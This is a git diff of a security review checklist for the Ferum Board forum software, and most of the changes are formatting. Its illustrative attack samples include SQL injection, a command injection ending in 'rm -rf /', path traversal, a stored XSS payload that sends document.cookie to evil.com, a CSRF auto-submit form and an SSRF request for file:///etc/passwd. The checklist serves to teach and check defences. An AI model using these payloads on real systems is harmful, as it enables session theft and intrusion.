@@ -46,6 +46,7 @@ SELECT * FROM users WHERE username = 'admin' OR '1'='1'
 **Where it appears:** Anywhere user input flows into a database query.
 
 **How to check:**
+
 - [ ] Grep all of `ferum-infrastructure/` for `raw_sql`, `format!("SELECT`, `query_builder.raw`
 - [ ] No string interpolation in queries — use Sea-ORM entity/column API only
 - [ ] All filter/search parameters go through `.filter(Column::eq(value))` or bind params
@@ -69,6 +70,7 @@ convert img.png; rm -rf /
 **Where it appears:** File/image processing, external tool calls, plugin execution.
 
 **How to check:**
+
 - [ ] Grep for `std::process::Command`, `Command::new()` across the entire codebase
 - [ ] Every argument passed to `Command` must be hardcoded or come from config — never directly from user input
 - [ ] Plugin Tier 2 (boa_engine JS sandbox) does not expose OS command execution
@@ -92,6 +94,7 @@ GET /themes/../../backend/src/config.rs
 **Where it appears:** File serving, theme upload, plugin install path, avatar/cover serving.
 
 **How to check:**
+
 - [ ] Every path built from user input goes through `canonicalize()` and is verified to remain within the allowed prefix
 - [ ] Theme slug contains only `^[a-z0-9-]+$` — no `/`, `\`, or `..`
 - [ ] Plugin `install_path` is not taken directly from the request
@@ -113,13 +116,16 @@ A malicious script is saved to the database and later rendered for every user wh
 
 ```html
 <!-- User posts: -->
-<script>fetch('https://evil.com?c='+document.cookie)</script>
+<script>
+  fetch("https://evil.com?c=" + document.cookie);
+</script>
 <!-- Everyone who reads that thread has their cookie stolen -->
 ```
 
 **Where it appears:** Post content, thread title, bio, display name — anything stored in DB then rendered.
 
 **How to check:**
+
 - [ ] `content_html` is sanitized through `ammonia` before saving — not at render time
 - [ ] Ammonia config whitelists only safe tags: `<b>`, `<i>`, `<a>`, `<code>`, `<pre>`, `<blockquote>`
 - [ ] `display_name`, `bio`, `website` are escaped in Tera (`{{ value }}` not `{{ value | safe }}`)
@@ -144,6 +150,7 @@ https://forum.com/search?q=<script>alert(document.cookie)</script>
 **Where it appears:** Search page, error page, redirect URL parameter.
 
 **How to check:**
+
 - [ ] Search query `q` is escaped when rendered: `{{ query }}` not `{{ query | safe }}`
 - [ ] Error messages from query params do not render raw HTML
 - [ ] `redirect_to` param is not injected into `<script>` blocks or meta refresh `href`
@@ -161,13 +168,14 @@ Client-side JavaScript injects user-controlled data into the DOM without going t
 
 ```js
 // Vulnerable:
-document.getElementById('msg').innerHTML = location.hash.slice(1)
+document.getElementById("msg").innerHTML = location.hash.slice(1);
 // URL: /forum#<img onerror=alert(1) src=x>
 ```
 
 **Where it appears:** `ferum-page-*.js`, Svelte widgets, Alpine.js expressions.
 
 **How to check:**
+
 - [ ] Grep for `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML` in `frontend/static/js/`
 - [ ] Svelte widgets use `{@html}` only with content already sanitized server-side
 - [ ] Alpine.js `x-html` is not used with user input
@@ -187,6 +195,7 @@ document.getElementById('msg').innerHTML = location.hash.slice(1)
 Flawed auth logic: verification skipped, token not properly validated, null/empty credentials accepted.
 
 **How to check:**
+
 - [ ] JWT verification always checks signature, expiry, and `iss`/`aud` claims
 - [ ] Middleware does not let requests proceed when a token is invalid (only sets `None` for optional auth)
 - [ ] Endpoints requiring auth (`RequireAuth`) reject immediately when `Option<AuthUser>` is `None`
@@ -206,6 +215,7 @@ Flawed auth logic: verification skipped, token not properly validated, null/empt
 JWT or refresh token leaks outside its intended scope.
 
 **How to check:**
+
 - [ ] JWT cookie is set with `HttpOnly`, `Secure` (production), `SameSite=Lax`
 - [ ] Token never appears in a URL query parameter
 - [ ] Token is never logged in access logs or structured logs
@@ -225,6 +235,7 @@ JWT or refresh token leaks outside its intended scope.
 The app distinguishes "user does not exist" from "wrong password" — attackers use the difference to enumerate valid usernames.
 
 **How to check:**
+
 - [ ] Login response: same message `"Invalid email or password"` for both cases
 - [ ] Forgot password response: always `"If this email exists, you will receive a reset link"` — does not reveal whether the email exists
 - [ ] Login timing: both cases take equivalent time (run bcrypt verify against a dummy hash when user does not exist)
@@ -244,6 +255,7 @@ The app distinguishes "user does not exist" from "wrong password" — attackers 
 A sensitive endpoint is hidden in the UI but has no real guard on the backend.
 
 **How to check:**
+
 - [ ] Every `/api/admin/*` route requires an `admin.*` permission — not just an `is_admin` flag
 - [ ] Every `/api/mod/*` route checks `moderation.*` permission
 - [ ] Permission checks live in the use case layer — not only in middleware or the router
@@ -267,6 +279,7 @@ GET  /api/bookmarks/456 # another user's bookmark → must fail
 ```
 
 **How to check:**
+
 - [ ] Edit post: verify `post.author_id == current_user.id` BEFORE updating
 - [ ] Delete own post: verify ownership before soft delete
 - [ ] Bookmark list: query filtered by `user_id = current_user.id` — not by a bookmark ID from the URL
@@ -288,6 +301,7 @@ GET  /api/bookmarks/456 # another user's bookmark → must fail
 Passwords stored as plain text, base64, or a weak hash — if the DB is dumped, credentials are immediately exposed.
 
 **How to check:**
+
 - [ ] `password_hash` column contains bcrypt hashes (starting with `$2b$`)
 - [ ] Only `BcryptPasswordHasher` in `ferum-infrastructure` calls `bcrypt::hash`
 - [ ] No other columns named `password`, `pass`, or `pwd` exist in the schema
@@ -305,6 +319,7 @@ Passwords stored as plain text, base64, or a weak hash — if the DB is dumped, 
 Using outdated cryptographic algorithms: MD5/SHA1 for passwords; DES/RC4 for encryption.
 
 **How to check:**
+
 - [ ] Passwords: bcrypt cost 12 — not MD5/SHA1/plain SHA256
 - [ ] JWT: HS256 with a strong secret (≥ 256 bits of entropy) — `none` algorithm must be rejected
 - [ ] Random tokens (password reset, email verify): `OsRng` or `uuid::Uuid::new_v4()` — not `rand::random()`
@@ -323,6 +338,7 @@ Using outdated cryptographic algorithms: MD5/SHA1 for passwords; DES/RC4 for enc
 Using a predictable PRNG instead of a CSPRNG to generate secret values — an attacker can predict the next token.
 
 **How to check:**
+
 - [ ] Password reset token: `uuid::Uuid::new_v4()` or `rand::rngs::OsRng`
 - [ ] Email verification token: same requirement
 - [ ] Webhook secret (if auto-generated): uses `OsRng`
@@ -343,6 +359,7 @@ Using a predictable PRNG instead of a CSPRNG to generate secret values — an at
 Security headers turned off, CORS too permissive, cookie flags missing.
 
 **How to check:**
+
 - [ ] Responses include all required headers: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`
 - [ ] CSP header present and correct: no `unsafe-eval`, `script-src` is restricted
 - [ ] CORS `Access-Control-Allow-Origin` is not `*` on authenticated endpoints
@@ -361,6 +378,7 @@ Security headers turned off, CORS too permissive, cookie flags missing.
 Debug mode, verbose errors, or development endpoints left active in production.
 
 **How to check:**
+
 - [ ] Stack traces never appear in HTTP responses (verify `AppError` / `HandlerError` mapping)
 - [ ] `RUST_LOG` in production is `info` or `warn` — not `debug` or `trace`
 - [ ] No `/debug`, `/internal`, or `/dev` routes in the production binary
@@ -381,6 +399,7 @@ Debug mode, verbose errors, or development endpoints left active in production.
 Dependencies from unverified sources, external CDN assets without integrity checks, unverified plugin packages.
 
 **How to check:**
+
 - [ ] `Cargo.lock` is committed — verify checksums have not changed unexpectedly
 - [ ] CDN assets (Bootstrap, FontAwesome) use `integrity="sha384-..."` attribute in HTML
 - [ ] Plugin `.fpkg` uploads: manifest structure is validated before installation
@@ -403,6 +422,7 @@ PATCH /api/users/me
 ```
 
 **How to check:**
+
 - [ ] `UpdateProfileRequest` only contains allowed fields: `display_name`, `bio`, `website`
 - [ ] `trust_level`, `is_banned`, `is_admin`, `role` do not appear in any user-facing request struct
 - [ ] DB update explicitly sets each column — no `set_from_json()` or equivalent
@@ -420,6 +440,7 @@ PATCH /api/users/me
 Deserializing complex data from user input without validation — an attacker crafts a payload to exploit type confusion or achieve RCE.
 
 **How to check:**
+
 - [ ] Plugin manifest JSON: schema is strictly validated before deserializing into a struct
 - [ ] Webhook payload JSONB: serialized from known structs only — not deserialized then re-executed
 - [ ] Cookie values (beyond JWT): if serialized/deserialized, use typed structs not raw `Value`
@@ -434,6 +455,7 @@ Deserializing complex data from user input without validation — an attacker cr
 ### 7.4 Using Known Vulnerable Components
 
 **How to check:**
+
 - [ ] `cargo audit` — zero high/critical advisories
 - [ ] `npm audit` in `frontend/client-widgets/` — zero high/critical findings
 - [ ] Dependencies with a CVE are updated within 7 days of the advisory being published
@@ -456,6 +478,7 @@ POST /api/admin/plugins {"url": "file:///etc/passwd"}
 **Where it appears:** Webhook URL, plugin asset URL, any fetch-by-URL feature.
 
 **How to check:**
+
 - [ ] Webhook URL validation: reject `localhost`, `127.x.x.x`, `10.x`, `172.16-31.x`, `192.168.x`, `169.254.x`, `::1`
 - [ ] Only `https://` scheme is accepted for webhook URLs — reject `file://`, `ftp://`, `gopher://`
 - [ ] `ferum-infrastructure/src/network_utils.rs::assert_no_private_ip()` is called before any outbound HTTP from plugin hooks — it resolves DNS and rejects private/reserved IPs (RFC-1918, loopback, link-local, CGNAT 100.64/10, IPv6 ULA/link-local)
@@ -477,10 +500,13 @@ A malicious site tricks a logged-in user's browser into sending a request to the
 <form method="POST" action="https://forum.com/api/threads" id="f">
   <input name="title" value="spam" />
 </form>
-<script>document.getElementById('f').submit()</script>
+<script>
+  document.getElementById("f").submit();
+</script>
 ```
 
 **How to check:**
+
 - [ ] Cookie `SameSite=Lax` — blocks cross-site POST requests
 - [ ] CSRF token middleware active on all POST/PATCH/PUT/DELETE requests
 - [ ] CSRF token validated via `X-CSRF-Token` header or `csrf_token` form field
@@ -507,6 +533,7 @@ An XML parser with external entity processing enabled allows reading system file
 **Where it appears:** SVG upload (SVG is XML), theme package XML config, feed import.
 
 **How to check:**
+
 - [ ] SVG uploads: parsed with external entities disabled, or sanitized with a dedicated library
 - [ ] Theme ZIP does not contain any XML that is parsed — only HTML templates and JSON config
 - [ ] If RSS/Atom import exists: parser configured with `expand_entities: false`
@@ -524,6 +551,7 @@ An XML parser with external entity processing enabled allows reading system file
 Missing logs for important security events — a breach occurs without being detected or traceable after the fact.
 
 **How to check:**
+
 - [ ] All failed login attempts are logged (email, IP, timestamp)
 - [ ] Account lockout events are logged
 - [ ] Permission denied events are logged (user_id, endpoint, required permission)
@@ -548,6 +576,7 @@ The app checks only the file extension or the `Content-Type` header (both forgea
 **Where it appears:** Avatar, cover image, thread thumbnail, theme upload, plugin upload.
 
 **How to check:**
+
 - [ ] Avatar/cover/thumbnail: magic bytes verified (JPEG: `FF D8 FF`, PNG: `89 50 4E 47`, WebP: `52 49 46 46 ... 57 45 42 50`)
 - [ ] `Content-Type` request header is never trusted alone — magic bytes are the source of truth
 - [ ] File size limits enforced server-side: avatar ≤ `MAX_AVATAR_BYTES`, cover ≤ `MAX_COVER_BYTES`
@@ -570,6 +599,7 @@ The app checks only the file extension or the `Content-Type` header (both forgea
 Missing input validation that leads to invalid state in the system.
 
 **How to check:**
+
 - [ ] Thread title: min/max length validated, cannot be empty
 - [ ] Post content: cannot be empty, max length enforced
 - [ ] Pagination: `page` and `per_page` must be positive; `per_page` has an upper bound (no `per_page=1000000`)
@@ -591,6 +621,7 @@ Missing input validation that leads to invalid state in the system.
 Incorrect flow logic that produces unintended behavior even without a technical error.
 
 **How to check:**
+
 - [ ] Email change: new email must be verified before it takes effect — not changed immediately
 - [ ] Password reset token: invalidated immediately after first use
 - [ ] User cannot react to their own post (if that is a business rule)
@@ -616,6 +647,7 @@ Incorrect flow logic that produces unintended behavior even without a technical 
 A secret committed to git, hardcoded in source, or leaked into logs.
 
 **How to check:**
+
 - [ ] `.env` file is in `.gitignore` — never committed
 - [ ] `JWT_SECRET`, `SMTP_PASS`, `S3_SECRET_KEY`, `MEILISEARCH_KEY` are loaded only from env vars
 - [ ] No hardcoded secrets in source code (grep for `"secret"`, `"password"`, `"api_key"` in Rust files)
@@ -634,6 +666,7 @@ A secret committed to git, hardcoded in source, or leaked into logs.
 An API key or secret is returned in a response or accessible via the API.
 
 **How to check:**
+
 - [ ] `GET /api/admin/webhooks` does not return the `secret` field (only `id`, `url`, `events`, `is_active`)
 - [ ] `GET /api/admin/config` does not return `smtp_pass` or `s3_secret_key`
 - [ ] `GET /api/admin/plugins/:slug` does not expose any internal plugin credentials
@@ -653,6 +686,7 @@ An API key or secret is returned in a response or accessible via the API.
 Login, password change, or other credentials sent over unencrypted HTTP.
 
 **How to check:**
+
 - [ ] Production: Nginx forces HTTP → HTTPS redirect (verify nginx config)
 - [ ] HSTS header: `Strict-Transport-Security: max-age=31536000; includeSubDomains`
 - [ ] Login form `action` does not hardcode `http://`
@@ -670,6 +704,7 @@ Login, password change, or other credentials sent over unencrypted HTTP.
 Sensitive data (PII, tokens, private content) transmitted over an unencrypted connection.
 
 **How to check:**
+
 - [ ] SSE stream (`/api/notifications/stream`): accessible only over HTTPS in production
 - [ ] File uploads: multipart forms submitted over HTTPS
 - [ ] Outbound webhooks: only sent to `https://` URLs (validated when saving a webhook)
@@ -689,6 +724,7 @@ Sensitive data (PII, tokens, private content) transmitted over an unencrypted co
 Responses return unnecessary fields: password hashes, ban reasons to guests, internal IDs, other users' emails.
 
 **How to check:**
+
 - [ ] `GET /api/users/:username` (public): does not return `email`, `password_hash`, `failed_login_count`, `ban_reason`
 - [ ] Thread list does not include `author.email` or `author.password_hash`
 - [ ] `GET /api/users/me` returns email but not `password_hash`
@@ -708,6 +744,7 @@ Responses return unnecessary fields: password hashes, ban reasons to guests, int
 Production error responses reveal stack traces, SQL errors, file paths, or internal state.
 
 **How to check:**
+
 - [ ] Panic handler: returns `500 Internal Server Error` with a generic message — no stack trace
 - [ ] Sea-ORM errors: mapped to `AppError::Internal` — SQL string never exposed
 - [ ] `AppError::Internal` → `HandlerError` returns only `{ "error": { "code": "internal_error", "message": "..." } }`
@@ -759,15 +796,15 @@ grep -rn 'secret\s*=\s*"' backend/crates/
 
 All items below must PASS before every release:
 
-| Check | Command |
-|---|---|
-| `cargo audit` clean | `cd backend && cargo audit` |
-| `npm audit` clean | `cd frontend/client-widgets && npm audit --audit-level=high` |
-| No `innerHTML =` with user data | `grep -rn "innerHTML" frontend/static/js/` |
-| No `\| safe` on user fields | `grep -rn "\| safe" frontend/` |
-| No hardcoded secrets | `grep -rn 'JWT_SECRET\s*=\s*"' backend/` |
-| Security headers present | Manual: `curl -I http://localhost:8080/` |
+| Check                           | Command                                                      |
+| ------------------------------- | ------------------------------------------------------------ |
+| `cargo audit` clean             | `cd backend && cargo audit`                                  |
+| `npm audit` clean               | `cd frontend/client-widgets && npm audit --audit-level=high` |
+| No `innerHTML =` with user data | `grep -rn "innerHTML" frontend/static/js/`                   |
+| No `\| safe` on user fields     | `grep -rn "\| safe" frontend/`                               |
+| No hardcoded secrets            | `grep -rn 'JWT_SECRET\s*=\s*"' backend/`                     |
+| Security headers present        | Manual: `curl -I http://localhost:5173/`                     |
 
 ---
 
-*This document is maintained for Ferum Board — update it when new features are added or new risky patterns are discovered.*
+_This document is maintained for Ferum Board — update it when new features are added or new risky patterns are discovered._
